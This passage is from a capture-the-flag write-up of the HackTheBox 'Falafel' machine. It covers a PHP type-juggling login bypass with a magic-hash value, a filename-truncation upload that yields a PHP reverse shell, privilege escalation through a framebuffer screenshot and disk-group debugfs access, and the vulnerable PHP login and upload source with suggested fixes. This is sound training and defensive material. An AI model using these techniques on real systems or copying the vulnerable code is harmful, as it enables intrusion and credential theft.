+<p>You might wonder if making such a large script compared to the earlier one is worth it, especially for a CTF. The answer is mostly no since the first works just fine. Making a more finer and dynamic script would improve your scripting skills, which is a very important skill to have in the industry and so developing scripts is encouraged.</p>
+<p>Now that we have found both the hashes, let&rsquo;s crack them. We successfully crack the chris&rsquo; hash and a password - <em><strong>juggling</strong></em> but unable to crack admins&rsquo; hash. Let&rsquo;s check out chris&rsquo; account while we are at it.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/10_chris.png" alt="Chris&rsquo; Account"></p>
+<p>There&rsquo;s nothing much here, except some more hints towards cracking admins&rsquo; hash - PHP Type Juggling.</p>
+<h3 id="php-type-juggling---cracking-admins-hash">PHP Type Juggling - Cracking Admins&rsquo; Hash</h3>
+<p>In the &ldquo;cyberlaw.txt&rdquo; file, we saw that chris was able to log into admins&rsquo; account without knowing the password and it certainly wasn&rsquo;t an SQL injection to bypass authentication. Chris&rsquo;s password hints at juggling and his account tells us that he works as a juggler and that <em>sometimes both the hobby and work have something in common</em>.</p>
+<p>But let&rsquo;s say we didn&rsquo;t have any of those hints to point towards PHP type juggling.</p>
+<p>When we take a closer look at admins&rsquo; hash, it does look a bit odd. It looks more like a massive number than a hash, and this massive number corresponding to 0 * 10<sup>4620..</sup> resulting to , you guessed it, 0 (zero). If you wanna try to get a number like that, take a calculator and multiply two biggest numbers the calculator can fit in and look at the result.</p>
+<p>This by default wouldn&rsquo;t introduce any kind of vulnerability, but PHP is a &ldquo;loosely-typed&rdquo; language. A loosely-typed language is one wherein there is no mention of datatype when defining a variable. Now since no datatype is specified, PHP will try to convert one thing to another (string to integer, integer to float, etc.) when loose comparisons (&quot;==&rdquo;) are used.</p>
+<p>Loose comparisons would convert one thing to another and then perform comparison, rather than performing the comparison as-is. So when a string (admins&rsquo; hash) is loosely compared to a number, PHP would convert it to a number first (causing the admin hash to become 0 (zero)) and then it will perform the comparison. If we send in any other thing whose hash look like admins&rsquo; - &ldquo;0e&hellip;&rdquo; it would also result in zero, both the hashes would &ldquo;match&rdquo;, and PHP will log us in.</p>
+<p>If you want to learn more about PHP type juggling, <a href="https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf">PHP Magic Tricks: Type Juggling</a> is a good talk (pdf) to checkout</p>
+<p>Let&rsquo;s look for a number that would also result in a similar &ldquo;0e..&rdquo; like hash to send to the PHP. The reason why we&rsquo;re looking for something would result in that hash instead of justing sending 0 is because PHP would be converting whatever we send in to a hash first, and hash of 0 won&rsquo;t give us what we want.</p>
+<p>Upon searching &ldquo;php 0e hash collision&rdquo;, I find a page which has some strings and number listed that result in &ldquo;0e&hellip;&rdquo; type hash.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/11_hash.png" alt="0e Type Hashes"></p>
+<p>Let&rsquo;s try &ldquo;240610708&rdquo; and see if it logs us in as admin.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/12_admin.png" alt="Admins&rsquo; Account"></p>
+<p>And we successfully log in as admin. We are immediately presented with an upload functionality, which from &ldquo;cyberlaw.txt&rdquo; we know is vulnerable.</p>
+<h2 id="initial-access---exploiting-upload-functionality">Initial Access - Exploiting Upload Functionality</h2>
+<p>First step to understand something is to use as an end-user would.</p>
+<p>Uploading a legitimate image &ldquo;google.png&rdquo; to the server</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload1.png" alt=""></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload2.png" alt=""></p>
+<p>We now know that it&rsquo;s using wget functionality of the linux to get the file.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload3.png" alt=""></p>
+<p>Actually uploads the file as is.</p>
+<p>Unfortunately you cannot keep some weird name of the file to upload as and inject the wget command that the server is running. Another thing we could do is see what would happen if we give it a file which is 255 characters long. In Linux, almost all the file related commands are restricted at 255 character length.</p>
+<p>Created a 255 character long string using msf pattern create, remove last 4 characters and then create a png file.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_1.png" alt="Create Unique File"></p>
+<p>Start a HTTP server, I&rsquo;m using a python3 server, and upload the file.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_2.png" alt="File Uploaded"></p>
+<p>Let&rsquo;s see how the file is saved as, since the uploaded files&rsquo; name has been shortened.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_3.png" alt="File Saved As"></p>
+<p>To get the offset, file length, we only care about the last 4 characters.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_4.png" alt="Offset Found"></p>
+<p>We found the offset of the unique string uploaded, thus the filename will get shortened if length increases from 232 characters removing any extension present.</p>
+<p>Created a string with 232 A&rsquo;s ( <code>python -c &quot;'A'*232&quot;</code> ) and appended &ldquo;test.png&rdquo;, created a file as that name, and uploaded it.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_5.png" alt="Test File Uploaded"></p>
+<p>Checking how it is saved as.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_6.png" alt="File Saved As"></p>
+<p>It has stripped the extension out. Let&rsquo;s rename the existing test file, replacing &ldquo;test&rdquo; with &ldquo;.php&rdquo;.
+The file has contents as follows, and is uploaded.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_7.png" alt="PHPInfo File Uploaded"></p>
+<p>Checking how it is saved as.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_8.png" alt="PHPInfo File Saved As"></p>
+<p>We have successfully saved the file with PHP extension. Let&rsquo;s browse to this file.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload4_9.png" alt="PHPInfo"></p>
+<p>PHPInfo function loads perfectly. Now let&rsquo;s copy a php reverse shell to PHPInfo test file we uploaded.
+I&rsquo;ve added &ldquo;GIF89a;&rdquo; as the first line of this file for safety reasons, and modified it as necessary.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload5.png" alt="Uploading Shell"></p>
+<p>Once the file is uploaded, we&rsquo;ll browse to it while our listener is on.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/14_upload6.png" alt="Getting A Shell"></p>
+<p>We have successfully gotten a shell as <code>www-data</code> user.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/.png" alt=""></p>
+<h3 id="escalating-to-moshe">Escalating To Moshe</h3>
+<p>First step is to always look for database credentials.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/15_db.png" alt="Database Credentials"></p>
+<p>We got a password for a user &ldquo;moshe&rdquo;. Let&rsquo;s see if our friend moshe re-used their password.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/16_privesc1.png" alt="Privilege Escalation 1"></p>
+<p>And they did. We succesfully escalate our privileges from <strong>www-data</strong> to <strong>moshe</strong>. Let&rsquo;s see if we can login via SSH.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/17_ssh.png" alt="Login Via SSH"></p>
+<p>And we can. Logging in via SSH ensures that we get the most functional shell on the system, this is important in order to use various commands like sudo.</p>
+<h3 id="escalating-to-yossi">Escalating To Yossi</h3>
+<p>Let&rsquo;s enumerate the machine as moshe. Checking home directory.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/18.png" alt="User.txt"></p>
+<p>We found user.txt, and it&rsquo;s readable, but that&rsquo;s no fun. We&rsquo;ll come back once we&rsquo;re root.
+Continuing with enumeration using <code>LinEnum.sh</code>.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/19_groups.png" alt="Groups"></p>
+<p>Having so many groups is quite odd. Let&rsquo;s look at all the files we or our groups own, apart from some. The <code>grep</code> removal of some files is done after the default results are reviewed once and decided that some files are not worth looking into.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">## Before
+for i in $(groups);do echo -e &quot;\n==========$i==========&quot;; find / -group $i 2&gt;/dev/null; done
+
+## After
+for i in $(groups);do echo -e &quot;\n==========$i==========&quot;; find / -group $i 2&gt;/dev/null | grep -v &quot;proc\|lib\|run\|sys&quot;; done
+</code></pre>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/20_group1.png" alt="&ldquo;adm&rdquo; Group"></p>
+<p>We have quite some logs on hand here.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/20_group2.png" alt="&ldquo;video&rdquo; Group"></p>
+<p>Video files are something I have never worked with and certainly looks more odd than logs, and so I will look at these first and then logs.</p>
+<p>By researching &ldquo;/dev/fb0&rdquo;, it turns out that it is a Frame Buffer Device. &ldquo;The frame buffer device provides an abstraction for the graphics hardware.&rdquo; More about frame buffer device can be learned from the <a href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">Kernel Documentation</a>.</p>
+<p>A thing that caught my eye out of curiousity was that you can take screenshots with this device itself, sounds pretty cool right? The contents of the screenshot are IN the device file, we can <code>cat</code> it to get its contents to some file.</p>
+<p>I searched how to use frame buffer and see if it is used and <code>dmesg</code> logs if you have accessed it.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame1.png" alt="Frame Buffer Log"></p>
+<p>Saving the contents of the frame buffer to a file</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame2.png" alt="Cat Screenshot"></p>
+<p>Looks like we have quite some data here (~ 4 Mb), could easily be a 720p image. Let&rsquo;s transfer this image to our machine.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame3.png" alt="Image Transferred"></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame3_2.png" alt="Checking File"></p>
+<p>To work with this I installed <code>gimp</code>. Since we do not know which kind of file it&rsquo;s and gimp did not automatically identify it as some extension.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame4.png" alt="Open Image As Raw Data"></p>
+<p>Once opening the image there are not much parameters to mess with, the only parameter that changes the image a lot is &ldquo;width&rdquo;.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame5.png" alt="Almost"></p>
+<p>At 941 width the image makes a lot more sense than from where we started with. Looks like a screenshot of <em>yossi</em> user changing their password. Let&rsquo;s keep going up.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame6.png" alt="Screenshot"></p>
+<p>At 1176 width the images is perfect. And we have the password of another user, time to escalate your privileges!</p>
+<p>While I was looking more into frame buffer screenshot, it turns out we could have saved some time by actually checking with what resolution a screenshot was taken with instead of all the guess work.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/21_frame7.png" alt="Screenshot Resolution"></p>
+<p>Let&rsquo;s change the user to yossi using <code>su</code></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/22_privesc2.png" alt="Escalated To Yossi"></p>
+<p>Now that we have escalated our privileges to yossi, let&rsquo;s get to enumeration again. If you remember, like moshe, yossi themselves had quite a lot of groups, so let&rsquo;s start there.</p>
+<h3 id="escalating-to-root">Escalating To Root</h3>
+<p>We will issue the same command as before to list all the files owned by groups yossi is a part of.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">for i in $(groups);do echo -e &quot;\n==========$i==========&quot;; find / -group $i 2&gt;/dev/null; done
+</code></pre>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/23_groups.png" alt="Disks Group"></p>
+<p>Out of all, the disks group was the most interesting to me. We have access to <em><strong>/dev/sda1</strong></em>! It is the main partition of the Linux filesystem in which all the data is stored, we could get access to every single file that is present on the system, including shadow and roots&rsquo; ssh key (if that exists)!</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/24_perms.png" alt="SDA1 Permissions"></p>
+<p>We not only have read access, but also write access. The way to access this file to get hold of a file is using <code>debugfs</code>, which lets you debug a file partition as long as you have read access to it.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/25_root_ssh.png" alt="Root SSH Key"></p>
+<p>We got the roots&rsquo; SSH private key, let&rsquo;s escalate our privileges. As a side note, <code>ls</code> actually works here, it just opens in a <code>less</code>-type way on the screen so it&rsquo;s not visible once you close it.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/26_root.png" alt="Logged In As Root"></p>
+<h2 id="getting-loot">Getting Loot</h2>
+<p>Now that we are root, let&rsquo;s go get our loot.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/27_flag0.png" alt="Root.txt"></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/27_flag1.png" alt="User.txt"></p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/28_shadow1.png" alt="">
+<img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/28_shadow2.png" alt="Shadow"></p>
+<h2 id="extra---vulnerability-analysis">Extra - Vulnerability Analysis</h2>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>All of the authentication and authorization logic is in the file: <code>login_logic.php</code>, which the endpoint <code>/login.php</code> includes in it. Contents of the file are as follows:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP">&lt;?php                                                 
+  include(&quot;connection.php&quot;);              
+  session_start();                          
+  if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {                       
+    if(!isset($_REQUEST['username'])&amp;&amp;!isset($_REQUEST['password'])){                                                                                        
+      //header(&quot;refresh:1;url=login.php&quot;);
+      $message=&quot;Invalid username/password.&quot;;                                                                                                                                                                                               
+      //die($message);                     
+      goto end;       
+          }                                                                                                                                                                                                                                                                  
+                                                          
+    $username = $_REQUEST['username'];                             
+    $password = $_REQUEST['password'];                                                                               
+                                                          
+    if(!(is_string($username)&amp;&amp;is_string($password))){    
+      //header(&quot;refresh:1;url=login.php&quot;);                                                                                            
+      $message=&quot;Invalid username/password.&quot;;
+      //die($message);                    
+      goto end;                              
+    }                                   
+                                                          
+    $password = md5($password);              
+    $message = &quot;&quot;;                      
+    if(preg_match('/(union|\|)/i', $username) or preg_match('/(sleep)/i',$username) or preg_match('/(benchmark)/i',$username)){                                                                                                                                                                                           
+      $message=&quot;Hacking Attempt Detected!&quot;;  
+      //die($message);                                                                                               
+      goto end;                                                                                                      
+    }                                         
+                                                                                                                     
+    $sql = &quot;SELECT * FROM users WHERE username='$username'&quot;;                                                                          
+    $result = mysqli_query($db,$sql);         
+    $users = mysqli_fetch_assoc($result);                                                                                             
+    mysqli_close($db);                   
+    if($users) {
+      if($password == $users['password']){
+        if($users['role']==&quot;admin&quot;){                                                                                 
+          $_SESSION['user'] = $username;
+          $_SESSION['role'] = &quot;admin&quot;;
+          header(&quot;refresh:1;url=upload.php&quot;);                                                                                         
+          //die(&quot;Login Successful!&quot;);
+          $message = &quot;Login Successful!&quot;;
+        }elseif($users['role']==&quot;normal&quot;){
+                                  $_SESSION['user'] = $username;                                                                                             
+                                  $_SESSION['role'] = &quot;normal&quot;;                                                                                              
+          header(&quot;refresh:1;url=profile.php&quot;);
+                                  //die(&quot;Login Successful!&quot;);                                                                                                
+          $message = &quot;Login Successful!&quot;;                          
+        }else{                                                     
+          $message = &quot;That's weird..&quot;;                             
+        }                                                                     
+      }                                                                       
+      else{                                                                   
+        $message = &quot;Wrong identification : &quot;.$users['username'];                                                                                             
+      }                                                                       
+    }                                                                         
+    else{                                                                     
+      $message = &quot;Try again..&quot;;                                               
+    }                                                                         
+    //echo $message;                                                          
+  }                                                                           
+  end:                                                                        
+?&gt;
+</code></pre>
+<p>On line 12, we can see that the username from our POST request is passed onto the PHP variable as-is.
+Down on line 30, we see that this variable is put in the SQL query which would be passed to the database and it would execute our malicious query and return the data or information back.</p>
+<p>On line 24, we can see why our UNION attacks did not work regardless of what we tried. If &ldquo;union&rdquo; string existed in the username parameter it&rsquo;d immediately send us a message &ldquo;Hacking Attempt Detected&rdquo; and throw our request out.</p>
+<p>On line 53, we see that we only get the message &ldquo;Wrong identification&rdquo;, if we&rsquo;re meeting just the username part of the authentication and not the password part.</p>
+<h3 id="upload-page">Upload Page</h3>
+<p><code>/upload.php</code></p>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP">&lt;?php include('authorized.php');?&gt;                                                                                                                                                                                                         
+&lt;?php                                                                                                                                                                                                                                      
+ error_reporting(E_ALL);                                                                                                                                                                                                                   
+ ini_set('display_errors', 1);                                                                                                                                                                                                             
+ function download($url) {                                                                                                                                                                                                                 
+   $flags  = FILTER_FLAG_SCHEME_REQUIRED | FILTER_FLAG_HOST_REQUIRED | FILTER_FLAG_PATH_REQUIRED;                                                                                                                                          
+   $urlok  = filter_var($url, FILTER_VALIDATE_URL, $flags);                                                                                                                                                                                
+   if (!$urlok) {                                                                                                                                                                                                                          
+     throw new Exception('Invalid URL');                                                                                                                                                                                                   
+   }                                                                                                                                                                                                                                       
+   $parsed = parse_url($url);                                                                                                                                                                                                              
+   if (!preg_match('/^https?$/i', $parsed['scheme'])) {                                                                                                                                                                                    
+     throw new Exception('Invalid URL: must start with HTTP or HTTPS');                                                                                                                                                                    
+   }                                                                                                                                                                                                                                       
+   $host_ip = gethostbyname($parsed['host']);                                                                                                                                                                                              
+   $flags  = FILTER_FLAG_IPV4 | FILTER_FLAG_NO_RES_RANGE;                                                                                                                                                                                  
+   $ipok  = filter_var($host_ip, FILTER_VALIDATE_IP, $flags);                                                                                                                                                                              
+   if ($ipok === false) {                                                                                                                                                                                                                  
+     throw new Exception('Invalid URL: bad host');                                                                                                                                                                                         
+   }                                                                                                                                                                                                                                       
+   $file = pathinfo($parsed['path']);                                                                                                                                                                                                      
+   $filename = $file['basename'];                                                                                                                                                                                                          
+   if(! array_key_exists( 'extension' , $file )){                                                                                                                                                                                          
+     throw new Exception('Bad extension');                                                                                                                                                                                                 
+   }                                                                                                                                                                                                                                       
+   $extension = strtolower($file['extension']);                                                                                                                                                                                            
+   $whitelist = ['png', 'gif', 'jpg'];                                                                                                                                                                                                     
+   if (!in_array($extension, $whitelist)) {                                                                                                                                                                                                
+     throw new Exception('Bad extension');                                                                                                                                                                                                 
+   }                                                                                                                                                                                                                                       
+   // re-assemble safe url                                                                                                                                                                                                                 
+   $good_url = &quot;{$parsed['scheme']}://{$parsed['host']}&quot;;                                                                                                                                                                                  
+   $good_url .= isset($parsed['port']) ? &quot;:{$parsed['port']}&quot; : '';                                                                                                                                                                        
+   $good_url .= $parsed['path'];                                                                                                                                                                                                           
+   $uploads  = getcwd() . '/uploads';                                                                                                                                                                                                      
+   $timestamp = date('md-Hi');                                                                                                                                                                                                             
+   $suffix  = bin2hex(openssl_random_pseudo_bytes(8));                                                                                                                                                                                     
+   $userdir  = &quot;${uploads}/${timestamp}_${suffix}&quot;;                                                                                                                                                                                        
+   if (!is_dir($userdir)) {                                                                                                                                                                                                                
+     mkdir($userdir);                                                                                                                                                                                                                      
+   }                                                                                                                                                                                                                                       
+   $cmd = &quot;cd $userdir; timeout 3 wget &quot; . escapeshellarg($good_url) . &quot; 2&gt;&amp;1&quot;;                                                                                                                                                            
+   $output = shell_exec($cmd);                                                                                                                                                                                                             
+   return [                                                                                                                                                                                                                                
+     'output' =&gt; $output,                                                                                                                                                                                                                  
+     'cmd' =&gt; &quot;cd $userdir; wget &quot; . escapeshellarg($good_url),                                                                                                                                                                            
+     'file' =&gt; &quot;$userdir/$filename&quot;,                                                                                                                                                                                                       
+   ];
+    }  
+
+ $error = false;  
+ $result = false;  
+ $output = '';  
+ $cmd = '';  
+ if (isset($_REQUEST['url'])) {  
+   try {  
+     $download = download($_REQUEST['url']);  
+     $output = $download['output'];  
+     $filepath = $download['file'];  
+     $cmd = $download['cmd'];  
+     $result = true; 
+   } catch (Exception $ex) {  
+     $result = $ex-&gt;getMessage();  
+     $error = true;  
+   }  
+ }  
+ ?&gt;  
+ &lt;!DOCTYPE html&gt;  
+ &lt;html&gt;  
+ &lt;head&gt;  
+   &lt;title&gt;Falafel Lovers - Image Upload&lt;/title&gt;  
+   &lt;?php include('style.php');?&gt; 
+        &lt;?php include('css/style.php');?&gt;
+ &lt;/head&gt;  
+ &lt;body&gt;  
+ &lt;?php include('header.php');?&gt;
+
+ &lt;br&gt;&lt;br&gt;&lt;br&gt;
+ &lt;div style='width: 60%;margin: 0 auto; color:#303030'&gt; 
+&lt;div class=&quot;container&quot; style=&quot;margin-top: 50px; margin-bottom: 50px;position: relative; z-index: 99; height: 110%;background:#F8F8F8;box-shadow: 10px 10px 5px #000000;padding-left: 50px;padding-right: 50px;&quot;&gt;
+&lt;br&gt;&lt;br&gt;
+   &lt;h1&gt;Upload via url:&lt;/h1&gt;  
+   &lt;?php if ($result !== false): ?&gt;  
+     &lt;div&gt;  
+       &lt;?php if ($error): ?&gt;  
+         &lt;h3&gt;Something bad happened:&lt;/h3&gt;  
+         &lt;p&gt;&lt;?php echo htmlentities($result); ?&gt;&lt;/p&gt;  
+       &lt;?php else: ?&gt;  
+        &lt;h3&gt;Upload Succsesful!&lt;/h3&gt; 
+        &lt;div&gt;  
+        &lt;h4&gt;Output:&lt;/h4&gt;  
+        &lt;pre&gt;CMD: &lt;?php echo htmlentities($cmd); ?&gt;&lt;/pre&gt;   
+        &lt;pre&gt;&lt;?php echo htmlentities($output); ?&gt;&lt;/pre&gt;
+        &lt;/div&gt;  
+       
+       &lt;?php endif; ?&gt;  
+       &lt;/div&gt;
+   &lt;?php endif; ?&gt;  
+   &lt;div&gt;
+        &lt;p&gt;Specify a URL of an image to upload:&lt;/p&gt;  
+     &lt;form method=&quot;post&quot;&gt;  
+       &lt;label&gt;  
+         &lt;input type=&quot;url&quot; name=&quot;url&quot; placeholder=&quot;http://domain.com/path/image.png&quot;&gt;  
+       &lt;/label&gt;  
+       &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;  
+     &lt;/form&gt;  
+&lt;br&gt;&lt;br&gt;
+ &lt;/div&gt;
+   &lt;/div&gt;  
+&lt;/div&gt;
+   &lt;footer&gt;  
+   &lt;/footer&gt;  
+ &lt;/body&gt;  
+ &lt;/html&gt;
+</code></pre>
+<p>If you saw this entire code and were trying to figure out where the vulnerability lies, it&rsquo;s in the way <code>wget</code> is used. This code apart from wget is pretty much secure from any kinda attacks as it&rsquo;s sanitizing the user-input very well.</p>
+<p>One way to make this code secure would&rsquo;ve been renaming the file that is being sent to download to random 4 characters, something like follows:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP">'cmd' =&gt; &quot;cd $userdir; wget &quot; . escapeshellarg($good_url) . &quot; -O &quot; . bin2hex(openssl_random_pseudo_bytes(4) . &quot;$extension&quot;)
+</code></pre>
+<p>You could test this on your own machine too, serve the .PHP.PNG file and download it using wget</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/29_wget.png" alt="Wget Fail"></p>
+<p>But if you make it save as some other name with the right extension, it would fix the vulnerability we faced.</p>
+<p><img src="/HackTheBox/htb-falafel-writeup-w-o-metasploit/30_fix.png" alt="Wget fix"></p>
+<p>With this, the code won&rsquo;t be vulnerable anymore as wget is no longer performing any kind of shortening on its&rsquo; own.</p>
+<p>Another way to make this secure would&rsquo;ve been to not use wget altogether, but rather using something else such as - <code>file_put_contents()</code> function of PHP.</p>
+<p>Downloading remote files on the server with user controlling which files to be downloaded and browsed to makes a very tricky situation for a developer, and one misconfiguration or a mistake could lead to a compromised web server.</p>
+<h2 id="fin">Fin</h2>
+<p>Both the scripts are available in this <a href="https://github.com/krnb/scripts">git repo</a>.
+If some part of it feels unexplained or you did not understand, feel free to contact me :)</p>
+<p>Take care, have a great day, and keep hackin'!</p>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
